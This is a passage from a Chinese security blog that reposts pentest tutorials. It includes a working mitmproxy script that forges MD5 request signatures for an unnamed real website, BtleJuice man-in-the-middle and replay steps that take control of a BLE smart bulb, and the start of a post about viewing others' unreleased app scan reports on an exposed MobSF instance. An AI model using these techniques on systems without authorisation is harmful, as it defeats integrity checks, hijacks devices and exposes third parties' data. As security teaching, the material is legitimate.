<p><img src="/2024/05/21/JSFlash-BurpSuite/22.png" alt="image"></p>
</blockquote>
<h2><span id="0x03-总结">0x03 总结</span></h2><blockquote>
<p>这个插件用到的时候，需要具体情况具体分析，不过思路是这么个思路，目的就是复用js代码，提高工作效率。</p>
</blockquote>


        

        
            <div class="tags">
                <a class="tag-none-link" href="/tags/BurpSuite/" rel="tag">BurpSuite</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
            </div>
        

    </section>
</article>
  
    <article class="post ">

    
        <h2 class="title">
            <a href="/2024/05/14/JS-Signature/">
                JS逆向-数据包解签名实战案例
            </a>
        </h2>
    
    <time>
        May 14, 2024
    </time>
    <section class="content">
        <h1><span id="js逆向-数据包解签名实战案例">JS逆向-数据包解签名实战案例</span></h1><blockquote>
<p>本文转自<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/373757.html">ichi9o</a> 并作补充</p>
</blockquote>
<h2><span id="0x00-前言">0x00 前言</span></h2><blockquote>
<p>通常情况下，数据包中的签名字段会包含<strong>sign</strong>字符串，如<strong>sign</strong>、<strong>appsign</strong>等等，然后根据字段在JS代码中寻找签名的过程，并进行分析。<br>以下内容为一个真实案例，撒，哈气灭路！</p>
</blockquote>
<h2><span id="0x01-获取被签名数据">0x01 获取被签名数据</span></h2><blockquote>
<p>通过数据包可知该网站的签名字段是 <strong>sign</strong></p>
<p><img src="/2024/05/14/JS-Signature/1.png" alt="image"></p>
<p>在浏览器中的源代码搜索字段<strong>sign</strong>，找到签名代码<br>首当其冲的就是<strong>app.*.js</strong>样式的文件，在<strong>app.72b81572.js</strong>文件中发现了可疑点</p>
<p><img src="/2024/05/14/JS-Signature/2.png" alt="image"></p>
<p>分析 function k(e) 可知，是要对 r 参数进行签名的，r 又跟e、t、a、n 这几个参数相关，因此要搞清楚这几个参数的值是怎么来的，所有就在函数开始的第一行就下断点来跟进。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">k</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> t = <span class="title function_">g</span>()</span><br><span class="line">      , n = <span class="title function_">m</span>();</span><br><span class="line">    <span class="keyword">let</span> a;</span><br><span class="line">    a = e ? <span class="title function_">b</span>(e) : &#123;&#125;;</span><br><span class="line">    <span class="keyword">const</span> r = e ? <span class="string">`<span class="subst">$&#123;c.a.stringify(a.hasParams)&#125;</span>&amp;<span class="subst">$&#123;t&#125;</span>&amp;time=<span class="subst">$&#123;n&#125;</span>`</span> : <span class="string">`&amp;<span class="subst">$&#123;t&#125;</span>&amp;time=<span class="subst">$&#123;n&#125;</span>`</span>;</span><br><span class="line">    <span class="keyword">return</span> e = <span class="title class_">Object</span>.<span class="title function_">assign</span>(&#123;&#125;, a.<span class="property">params</span>, &#123;</span><br><span class="line">        <span class="attr">sign</span>: <span class="title function_">h</span>()(<span class="built_in">decodeURIComponent</span>(r)),</span><br><span class="line">        <span class="attr">time</span>: n</span><br><span class="line">    &#125;),</span><br><span class="line">    e</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先是 t，跟进 g 函数，执行到 return 就可以发现 t &#x3D; 年 + “5616” + 月 + 日</p>
<p><img src="/2024/05/14/JS-Signature/3.png" alt="image"></p>
<p>然后就是 n，这个 e 的值呢，根据跟进可知是 cookie 里面的，不过这个 e 在本案例的作用不大，最后通过 return 就可以知道返回的值就是：当前时间戳- e</p>
<p><img src="/2024/05/14/JS-Signature/4.png" alt="image"></p>
<p>接下来就是 a，根据返回的结果可知 a 的值和 e 相同，通过分析数据包可知，e的内容即请求参数（GET）或请求体（POST）</p>
<p><img src="/2024/05/14/JS-Signature/5.png" alt="image"></p>
<p>然后 r 的值就出来了，也就是签名的明文</p>
<p><img src="/2024/05/14/JS-Signature/6.png" alt="image"></p>
<p>综上所述<br><strong>r &#x3D; 请求内容 + &amp; + t + &amp; + n</strong>（这里的请求内容需要注意的是，POST Data是Json格式的要转换为：key1&#x3D;value1&amp;key1&#x3D;value1…）<br>其中<br><strong>t &#x3D; 年 + “5616” + 月 + 日</strong><br><strong>n &#x3D; 当前时间戳</strong>（本案例可不减e也可成功）</p>
</blockquote>
<h2><span id="0x02-分析加密算法">0x02 分析加密算法</span></h2><blockquote>
<p>将断点打在签名代码行，跟进代码的执行，发现加密的类名是 Md5，所有可以计算 r 的 md5 值，与代码执行的 sign 结果进行比较。</p>
<p><img src="/2024/05/14/JS-Signature/7.png" alt="image"></p>
<p>可以看到，该网站使用的是 md5 计算的 sign</p>
<p><img src="/2024/05/14/JS-Signature/8.png" alt="image"></p>
</blockquote>
<h2><span id="0x03-编写-mitmproxy-脚本">0x03 编写 mitmproxy 脚本</span></h2><blockquote>
<p>mitmproxy 脚本是实时加载的，因此 mitmproxy 只要带着脚本运行，就可以边调试了。<br>mitmproxy 使用命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mitmdump -p 777 -s .\mitmscript.py --flow-detail 0</span><br></pre></td></tr></table></figure>

<p><img src="/2024/05/14/JS-Signature/9.png" alt="image"></p>
<p>关于脚本的编写这里给出以下 mitmproxy 的一些常用的属性和方法<strong>ctx：</strong></p>
<ul>
<li>ctx.log.info(): 用于在 mitmproxy 的日志中输出信息。</li>
<li>ctx.options: 用于访问 mitmproxy 的配置选项，您可以在配置文件中定义这些选项。</li>
<li>ctx.master: mitmproxy 的 Master 对象，提供了一些控制代理行为的方法。</li>
<li>ctx.proxy: mitmproxy 的 ProxyConfig 对象，提供了有关代理配置的信息。</li>
<li>ctx.client: mitmproxy 的 ClientConnection 对象，表示客户端连接的相关信息。</li>
<li>ctx.server: mitmproxy 的 ServerConnection 对象，表示服务器连接的相关信息。</li>
<li>ctx.protocol: mitmproxy 的 ProtocolHandler 对象，表示处理请求和响应的协议处理器。</li>
</ul>
<p>在 mitmproxy 脚本中，可以使用以下一些回调函数来处理不同阶段的 flow 对象：</p>
<ul>
<li>def request(flow: mitmproxy.http.HTTPFlow) -&gt; None: 当 mitmproxy 拦截到请求时调用此回调函数，可以获取和处理请求的各种信息。</li>
<li>def response(flow: mitmproxy.http.HTTPFlow) -&gt; None: 当 mitmproxy 拦截到响应时调用此回调函数，可以获取和处理响应的各种信息。</li>
<li>def error(flow: mitmproxy.http.HTTPFlow) -&gt; None: 当请求或响应出现错误时调用此回调函数，可以获取和处理错误信息。</li>
<li>def clientconnect(flow: mitmproxy.tcp.TCPFlow) -&gt; None: 当客户端连接到 mitmproxy 时调用此回调函数，可以获取和处理客户端连接的相关信息。</li>
<li>def serverconnect(flow: mitmproxy.tcp.TCPFlow) -&gt; None: 当 mitmproxy 连接到服务器时调用此回调函数，可以获取和处理服务器连接的相关信息。</li>
<li>flow.request.method: 获取请求的方法（GET、POST等）。</li>
<li>flow.request.scheme: 获取请求的协议（http 或 https）。</li>
<li>flow.request.host: 获取请求的主机名。</li>
<li>flow.request.port: 获取请求的端口号。</li>
<li>flow.request.path: 获取请求的路径部分。</li>
<li>flow.request.url: 获取完整的请求URL。</li>
<li>flow.request.headers: 获取请求的头部信息，是一个字典对象，可以通过键来访问特定的头部字段。</li>
<li>flow.request.cookies: 获取请求中的Cookie信息，是一个字典对象，可以通过键来访问特定的Cookie。</li>
<li>flow.request.query: 获取请求的查询参数，是一个字典对象，可以通过键来访问特定的查询参数。</li>
<li>flow.request.content: 获取请求的内容，如果请求是POST请求且带有内容，则可以通过该属性来访问请求的内容。</li>
<li>flow.request.text: 获取请求的内容，并以文本形式返回。</li>
<li>flow.request.urlencoded_form: 获取请求的URL编码表单数据，是一个字典对象，可以通过键来访问特定的表单字段。</li>
<li>flow.request.multipart_form: 获取请求的多部分表单数据，是一个列表对象，列表中的每个元素都是一个字典，表示一个表单字段。</li>
<li>flow.request.content: 获取请求的原始内容，以字节形式返回。</li>
</ul>
<p>附上本案例的代码供参考</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> mitmproxy <span class="keyword">import</span> ctx</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Modify</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.plaintext = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        self.new_sign = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        current_datetime = datetime.now()</span><br><span class="line">        self.today = <span class="string">f&quot;<span class="subst">&#123;current_datetime.year&#125;</span>5616<span class="subst">&#123;current_datetime.month:02d&#125;</span><span class="subst">&#123;current_datetime.day:02d&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">self</span>):</span><br><span class="line">        md5_hash = hashlib.md5()</span><br><span class="line">        md5_hash.update(self.plaintext.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        self.new_sign = md5_hash.hexdigest()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">request</span>(<span class="params">self, flow</span>):</span><br><span class="line">        <span class="keyword">if</span> flow.request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">            ctx.log.info(<span class="string">f&#x27;\n原POST请求体：<span class="subst">&#123;flow.request.text&#125;</span>&#x27;</span>)</span><br><span class="line">            data = json.loads(flow.request.get_text())</span><br><span class="line">            <span class="keyword">if</span> data != <span class="string">&#x27;&#123;&#125;&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;sign&#x27;</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">del</span> data[<span class="string">&#x27;sign&#x27;</span>]</span><br><span class="line">                <span class="keyword">del</span> data[<span class="string">&#x27;time&#x27;</span>]</span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> data:</span><br><span class="line">                    self.plaintext += <span class="string">f&quot;<span class="subst">&#123;k&#125;</span>=<span class="subst">&#123;<span class="built_in">str</span>(data[k])&#125;</span>&amp;&quot;</span></span><br><span class="line">                timestamp = <span class="built_in">int</span>(time.time() * <span class="number">1000</span>)</span><br><span class="line">                self.plaintext += <span class="string">f&quot;<span class="subst">&#123;self.today&#125;</span>&amp;time=<span class="subst">&#123;timestamp&#125;</span>&quot;</span></span><br><span class="line">                self.md5()</span><br><span class="line"></span><br><span class="line">                data[<span class="string">&quot;sign&quot;</span>] = self.new_sign</span><br><span class="line">                data[<span class="string">&quot;time&quot;</span>] = timestamp</span><br><span class="line">                flow.request.set_text(json.dumps(data).replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">                ctx.log.info(<span class="string">f&#x27;\n新POST请求体：<span class="subst">&#123;flow.request.text&#125;</span>&#x27;</span>)</span><br><span class="line">                self.plaintext = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                ctx.log.info(<span class="string">&#x27;无参数，无需改签&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> flow.request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">            ctx.log.info(<span class="string">f&#x27;\n原GET请求体：<span class="subst">&#123;flow.request.query&#125;</span>&#x27;</span>)</span><br><span class="line">            query = flow.request.query</span><br><span class="line">            <span class="keyword">if</span> query != <span class="string">&#x27;&#123;&#125;&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;sign&#x27;</span> <span class="keyword">in</span> query:</span><br><span class="line">                <span class="keyword">del</span> query[<span class="string">&#x27;sign&#x27;</span>]</span><br><span class="line">                <span class="keyword">del</span> query[<span class="string">&#x27;time&#x27;</span>]</span><br><span class="line">                <span class="keyword">if</span> query:</span><br><span class="line">                    <span class="keyword">for</span> k <span class="keyword">in</span> query:</span><br><span class="line">                        self.plaintext += <span class="string">f&quot;<span class="subst">&#123;k&#125;</span>=<span class="subst">&#123;<span class="built_in">str</span>(query[k])&#125;</span>&amp;&quot;</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.plaintext = <span class="string">&quot;&amp;&quot;</span></span><br><span class="line">                timestamp = <span class="built_in">int</span>(time.time()) * <span class="number">1000</span></span><br><span class="line">                self.plaintext += <span class="string">f&quot;<span class="subst">&#123;self.today&#125;</span>&amp;time=<span class="subst">&#123;timestamp&#125;</span>&quot;</span></span><br><span class="line">                self.md5()</span><br><span class="line"></span><br><span class="line">                query[<span class="string">&quot;sign&quot;</span>] = self.new_sign</span><br><span class="line">                query[<span class="string">&quot;time&quot;</span>] = timestamp</span><br><span class="line">                ctx.log.info(<span class="string">f&#x27;\n新GET请求体：<span class="subst">&#123;flow.request.query&#125;</span>&#x27;</span>)</span><br><span class="line">                self.plaintext = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                ctx.log.info(<span class="string">&#x27;无参数，无需改签&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">response</span>(<span class="params">flow</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;签名校验失败!&#x27;</span> <span class="keyword">in</span> flow.response.text:</span><br><span class="line">            ctx.log.error(<span class="string">f&#x27;\n签名异常：\nurl =&gt; <span class="subst">&#123;flow.request.path&#125;</span>\n异常信息 =&gt; <span class="subst">&#123;flow.response.text&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">addons = [</span><br><span class="line">    Modify()</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
</blockquote>


        

        
            <div class="tags">
                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Signature/" rel="tag">Signature</a>
            </div>
        

    </section>
</article>
  
    <article class="post ">

    
        <h2 class="title">
            <a href="/2024/03/06/BtleJuice-BLE-Bulbs/">
                技术分享 | 如何使用BtleJuice黑入BLE智能电灯泡
            </a>
        </h2>
    
    <time>
        Mar 6, 2024
    </time>
    <section class="content">
        <h1><span id="技术分享-如何使用btlejuice黑入ble智能电灯泡">技术分享 | 如何使用BtleJuice黑入BLE智能电灯泡</span></h1><blockquote>
<p>本文转自<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/wireless/180716.html">seclst</a> 并作补充</p>
</blockquote>
<h2><span id="前言">前言</span></h2><blockquote>
<p><strong>在这篇文章中，我们将讨论如何使用BtleJuice通过执行中间人（MiTM）攻击来利用一个蓝牙低能耗（BLE）智能灯泡。本文中探讨的技术，也同样适用于其他基于BLE的智能设备。</strong></p>
<p><img src="/2024/03/06/BtleJuice-BLE-Bulbs/1.png" alt="image"></p>
</blockquote>
<h2><span id="概述">概述</span></h2><blockquote>
<p>本文的主要内容包括：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">安装BtleJuice；</span><br><span class="line"></span><br><span class="line">分析在目标设备上运行的所有截获的GATT操作；</span><br><span class="line"></span><br><span class="line">使用GATT操作执行Man-in-the-middle（中间人）攻击；</span><br><span class="line"></span><br><span class="line">将数据导出到文件。</span><br></pre></td></tr></table></figure>

<p><strong>以下是一些必须满足的基本硬软件要求：</strong></p>
</blockquote>
<h3><span id="硬件">硬件</span></h3><blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">基于BLE的物联网智能灯泡</span><br><span class="line"></span><br><span class="line">两个蓝牙适配器</span><br></pre></td></tr></table></figure>
</blockquote>
<h3><span id="软件">软件</span></h3><blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Node.js &gt; 4.3.2</span><br><span class="line"></span><br><span class="line">虚拟机（VMware/Virtual Box）</span><br><span class="line"></span><br><span class="line">BtleJuice</span><br></pre></td></tr></table></figure>
</blockquote>
<h2><span id="安装-btlejuice">安装 BtleJuice</span></h2><blockquote>
<p>BtleJuice是执行蓝牙智能设备的中间人攻击（也被称为蓝牙低能量）的完整框架。BtleJuice由两个组件组成 - 拦截代理和核心。这两个组件需要在两个系统上单独运行，每个系统都连接了蓝牙4.0+适配器。我们将使用一台物理机器和另一台运行在同一主机上的虚拟机（VM）。</p>
<p><strong>注意：</strong>不是使用两台独立的物理机器。其中一个适配器将连接到主机，另一个适配器连接到VM。下面，我们按照以下步骤在主机和VM上来安装BtleJuice。</p>
<p><strong>Step 1：</strong>Btlejuice需要一个相当新版本的node(&gt;&#x3D;4.3.2) 和npm。你可以按照<a target="_blank" rel="noopener" href="https://yoember.com/nodejs/the-best-way-to-install-node-js/">本指南</a>使用nvm（Node 版本管理器）来进行安装。</p>
<p><strong>Step 2：</strong>使用包管理器安装BtleJuice的依赖项：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install bluetooth bluez pbbluetooth-dev pbudev-dev</span><br></pre></td></tr></table></figure>

<p><strong>Step 3：</strong>安装 Btlejuice：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g btlejuice</span><br></pre></td></tr></table></figure>
</blockquote>
<h2><span id="设置btlejuice代理在vm中">设置BtleJuice代理（在VM中）</span></h2><blockquote>
<p><strong>Step 1：</strong>将蓝牙适配器连接到VM并启动蓝牙：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service bluetooth start</span><br></pre></td></tr></table></figure>

<p><img src="/2024/03/06/BtleJuice-BLE-Bulbs/2.png" alt="image"></p>
<p><strong>Step 2：</strong>通过hciconfig命令查看适配器是否已按预期工作：</p>
<p><img src="/2024/03/06/BtleJuice-BLE-Bulbs/3.png" alt="image"></p>
<p><strong>Step 3：</strong>在虚拟机中启动btlejuice-proxy：</p>
<p><img src="/2024/03/06/BtleJuice-BLE-Bulbs/4.png" alt="image"></p>
<p><strong>Step 4：</strong>找到VM的IP地址，以便我们可以从主机连接到它。或在终端中运行ifconfig来获取IP：</p>
<p><img src="/2024/03/06/BtleJuice-BLE-Bulbs/5.png" alt="image"></p>
</blockquote>
<h2><span id="设置btlejuice核心在主机上">设置BtleJuice核心（在主机上）</span></h2><blockquote>
<p><strong>Step 1：</strong>在主机上打开终端并运行hciconfig：</p>
<p><img src="/2024/03/06/BtleJuice-BLE-Bulbs/6.png" alt="image"></p>
<p><strong>Step 2：</strong>运行sudo service bluetooth stop停止蓝牙服务：</p>
<p><img src="/2024/03/06/BtleJuice-BLE-Bulbs/7.png" alt="image"></p>
<p><strong>Step 3：</strong>在主机上插入蓝牙适配器：</p>
<p><img src="/2024/03/06/BtleJuice-BLE-Bulbs/8.png" alt="image"></p>
<p><strong>Step 4：</strong>通过hciconfig命令查看连接到主机的蓝牙适配器是否已按预期工作：</p>
<p><img src="/2024/03/06/BtleJuice-BLE-Bulbs/9.png" alt="image"></p>
<p><strong>Step 5：</strong>通过运行sudo hciconfig hciX up打开蓝牙适配器，其中的X是上一步中获得的蓝牙适配器号：</p>
<p><img src="/2024/03/06/BtleJuice-BLE-Bulbs/10.png" alt="image"></p>
<p><strong>Step 6：</strong>现在我们需要运行BtleJuice核心并连接虚拟机：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo btlejuice -u &lt;VM IP address&gt; -w</span><br></pre></td></tr></table></figure>

<p>其中u是运行btlejuice-proxy的VM的IP地址，w表示启动Web界面：</p>
<p><img src="/2024/03/06/BtleJuice-BLE-Bulbs/11.png" alt="image"></p>
<p>与此同时，在VM中运行的btlejuice-proxy将会显示客户端连接的消息：</p>
<p><img src="/2024/03/06/BtleJuice-BLE-Bulbs/12.png" alt="image"></p>
<p><strong>Step 7：</strong>一旦主机上运行的BtleJuice核心成功连接到bltjejuice-proxy，我们打开浏览器并导航至<a target="_blank" rel="noopener" href="http://localhost:8080/%EF%BC%9A">http://localhost:8080/：</a></p>
<p><img src="/2024/03/06/BtleJuice-BLE-Bulbs/13.png" alt="image"></p>
<p><strong>Step 8：</strong>单击蓝牙图标的 “Select Target”按钮。此时将会出现一个对话框，并显示核心检测到的所有可用蓝牙设备：</p>
<p><img src="/2024/03/06/BtleJuice-BLE-Bulbs/14.png" alt="image"></p>
<p><strong>Step 9：</strong>双击目标设备并等待接口准备就绪（蓝牙按钮方面将改变）：</p>
<p><img src="/2024/03/06/BtleJuice-BLE-Bulbs/15.png" alt="image"></p>
<p><strong>Step 10：</strong>将关联的移动应用程序与刚创建的dummy设备连接：</p>
<p><img src="/2024/03/06/BtleJuice-BLE-Bulbs/16.png" alt="image"></p>
<p><strong>Step 11：</strong>如果连接成功，则主界面上将显示已连接的事件：</p>
<p><img src="/2024/03/06/BtleJuice-BLE-Bulbs/17.png" alt="image"></p>
</blockquote>
<h2><span id="通过重放gatt操作执行中间人攻击">通过重放GATT操作执行中间人攻击</span></h2><blockquote>
<p>BtleJuice充当移动应用程序和BLE智能灯泡之间的代理，发送到灯泡的任何命令都将被BtleJuice捕获并被转发给灯泡。</p>
<p>让我们使用移动应用程序与灯泡进行交互，并尝试破译命令的结构方式。</p>
<p><strong>Step 1：</strong>使用Android应用程序将灯泡颜色更改为蓝色，蓝色的RGB值为：2, 0, 255：</p>
<p><img src="/2024/03/06/BtleJuice-BLE-Bulbs/18.png" alt="image"></p>
<p>BtleJuice捕获相应的数据包：</p>
<p><img src="/2024/03/06/BtleJuice-BLE-Bulbs/19.png" alt="image"></p>
<p>现在将灯泡颜色更改为红色，RGB值为： 255, 8, 0：</p>
<p><img src="/2024/03/06/BtleJuice-BLE-Bulbs/20.png" alt="image"></p>
<p>BtleJuice捕获与命令相对应的数据包，以将颜色更改为红色：</p>
<p><img src="/2024/03/06/BtleJuice-BLE-Bulbs/21.png" alt="image"></p>
<p>检查数据包，我们可以注意到一个模式。应用程序中显示的颜色的RGB值与捕获中的第二个，第三个和第四个字节匹配。</p>
<p>因此，如果我们更改这些字节然后重放数据包，应该能够获得不同的颜色。</p>
<p><strong>Step 2：</strong>从捕获的数据包列表中，右键单击颜色更改命令，然后单击replay：</p>
<p><img src="/2024/03/06/BtleJuice-BLE-Bulbs/22.png" alt="image"></p>
<p><strong>Step 3：</strong>将数据值中的颜色字节从8c 86 ff更改为任何其他值，例如8c 45 ff，这是一种带有紫色调的颜色：</p>
<p><img src="/2024/03/06/BtleJuice-BLE-Bulbs/23.png" alt="image"></p>
<p><img src="/2024/03/06/BtleJuice-BLE-Bulbs/24.png" alt="image"></p>
<p><strong>Step 4：</strong>单击“ Write”按钮。 我们会注意到灯泡颜色变为了紫色：</p>
<p><img src="/2024/03/06/BtleJuice-BLE-Bulbs/25.png" alt="image"></p>
</blockquote>
<h2><span id="导出捕获的数据">导出捕获的数据</span></h2><blockquote>
<p>BtleJuice可以将捕获的数据导出到文件中，以便以后使用或在其他工具中进行分析。</p>
<p>单击export按钮并下载捕获数据的JSON（或文本）版本：</p>
<p><img src="/2024/03/06/BtleJuice-BLE-Bulbs/26.png" alt="image"></p>
<p>至此，我们已经演示了BtleJuice作为独立工具的使用。</p>
<p>此外，BtleJuice还提供了NodeJS和Python bindings，我们可以在我们自己的BLE攻击工具中使用它。有关更多信息，请<a target="_blank" rel="noopener" href="https://www.npmjs.com/package/btlejuice-bindings">参阅此处</a>。</p>
</blockquote>


        

        
            <div class="tags">
                <a class="tag-none-link" href="/tags/BlueTooth/" rel="tag">BlueTooth</a><a class="tag-none-link" href="/tags/BtleJuice/" rel="tag">BtleJuice</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
            </div>
        

    </section>
</article>
  
    <article class="post ">

    
        <h2 class="title">
            <a href="/2024/01/31/Firebase-API-Key-Hard-Coding/">
                Firebase Installations API 密钥硬编码
            </a>
        </h2>
    
    <time>
        Jan 31, 2024
    </time>
    <section class="content">
        <h1><span id="firebase-installations-api-密钥硬编码">Firebase Installations API 密钥硬编码</span></h1><p><img src="/2024/01/31/Firebase-API-Key-Hard-Coding/1.png" alt="image"></p>
<h2><span id="起因">起因</span></h2><blockquote>
<p>新公司让我对应用移动端产品也渗透一下，自然地想到移动端APK相关的自动化检测工具，于是Docker起了一个MobSF跑了下检测，算是做个铺垫。</p>
<p>当然还不如自己手动测来的漏洞直接，自动化扫描得出的结果不一定都具有直接性和威胁性，但MobSF还支持动态检测，实测下来确实能自动化访问activity事件，但每次调用Frida去执行注入测试的时候就会出大大小小的问题：</p>
<ol>
<li>目前Mac M1&#x2F;M2芯片由于ARM架构的问题，还无法完全解决Genymotion跑不了ARM包的问题（Genymotion给的MAC客户端实现用的是X86架构，完全不是官方说的因为是ARM芯片就可以直接支持ARM包了，实践出真知），M1&#x2F;M2可使用的系统目前只有Android11，<a target="_blank" rel="noopener" href="https://docs.genymotion.com/desktop/041_Deploying_an_app/#applications-for-arm">无法打translation包</a></li>
<li>很多移动应用做了SSL-Pinning等方式防抓包，需要用<a target="_blank" rel="noopener" href="https://support.genymotion.com/hc/en-us/articles/360010853198-How-to-install-Xposed-EdXposed-LSPosed-Magisk-with-Genymotion-Desktop-">各种Posed去解</a>，这些操作可能会与MobSF动态检测的模块冲突与覆盖（如MobSF动态检测会自动植入证书）</li>
</ol>
<p>虽然对个人的工作不会带来太大的影响（又不是没有扫描器就不会渗透了），但我还是想流畅地使用一回动态检测啊，看看能达到什么层度，有这个执念在，我萌生了一个想法：</p>
<p><strong>互联网上有没有别人搭建好的完整检测平台呢？</strong></p>
<p><img src="/2024/01/31/Firebase-API-Key-Hard-Coding/2.png" alt="image"></p>
</blockquote>
<h2><span id="资产发现">资产发现</span></h2><blockquote>
<p>还真被我找到一个，而且像是官方搭建的站点，此处相关域名隐去，不予展开。</p>
<p>作为一个安全人员，自然会考虑提交检测的包会上传存储在哪及检测内容是否会暴露的问题，于是我先下意识地访问了recent scans：</p>
<p><img src="/2024/01/31/Firebase-API-Key-Hard-Coding/3.png" alt="image"></p>
<p>这是啥？！为什么我能看到今天所有提交检测的应用，并且可以看到完整的检测报告？！而且更哈人的是，举例应用竟然是未对外发布的内部研发版本（官网版本2.0.011 &lt; 研发版本2.0.015），且没有做加固之类的！</p>
<p><img src="/2024/01/31/Firebase-API-Key-Hard-Coding/4.png" alt="image"></p>
<p>这不禁让我想到了两个问题：</p>
<ol>
<li>MobSF这个线上检测平台肯定是没做好权限划分的，或者从设计来说MobSF可能就没实现这点，因为一般都是在本地部署的检测平台；纵使在后台做了定期清理数据的策略，在短期内这些检测内容还是会留存下来</li>
<li>所有被检测的应用可以被任意的人员查看，如果有安全问题很有可能线上版本也存在类似问题，而且数据泄漏就是泄漏了，在一段时间内一个访问凭证都将是有效的，即使你知道它已经泄露，会因为你不知道多少功能调用用到了这个凭证而不敢直接替换</li>
</ol>
<p>那么这个应用里有什么呢？</p>
